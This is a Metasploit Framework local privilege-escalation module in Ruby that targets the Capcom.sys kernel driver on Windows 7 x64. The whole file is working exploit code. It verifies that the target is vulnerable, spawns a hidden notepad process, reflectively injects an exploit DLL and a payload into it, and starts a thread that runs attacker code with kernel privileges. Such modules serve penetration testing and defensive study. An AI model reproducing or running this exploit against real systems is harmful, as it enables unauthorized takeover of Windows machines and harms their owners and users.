##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'            => 'Windows Capcom.sys Kernel Execution Exploit (x64 only)',
      'Description'     => %q{
        This module abuses the Capcom.sys kernel driver's function that allows for an
        arbitrary function to be executed in the kernel from user land. This function
        purposely disables SMEP prior to invoking a function given by the caller.
        This has been tested on Windows 7 x64.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [
          'TheWack0lian',    # Issue discovery
          'OJ Reeves'        # exploit and msf module
        ],
      'Arch'            => [ ARCH_X86_64],
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'DefaultOptions'  => {
          'EXITFUNC'    => 'thread',
        },
      'Targets'         => [
          [ 'Windows x64 (<= 8)', { 'Arch' => ARCH_X86_64 } ]
        ],
      'Payload'         => {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'      => [
          ['URL', 'https://twitter.com/TheWack0lian/status/779397840762245124']
        ],
      'DisclosureDate'  => 'Jan 01 1999', # non-vuln exploit date
      'DefaultTarget'   => 0
    }))
  end

  def check
    if sysinfo['OS'] !~ /windows 7/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo['Architecture'] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    else
      return Exploit::CheckCode::Safe
    end

    file_path = expand_path('%windir%') << '\\system32\\capcom.sys'
    return Exploit::CheckCode::Safe unless file_exist?(file_path)

    # TODO: check for the capcom.sys driver and its version.
    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    check_result = check
    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

    if sysinfo['Architecture'] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported, please get an x64 session')
    elsif sysinfo['Architecture'] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")

    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'capcom_sys_exec',
                               'capcom_sys_exec.x64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end
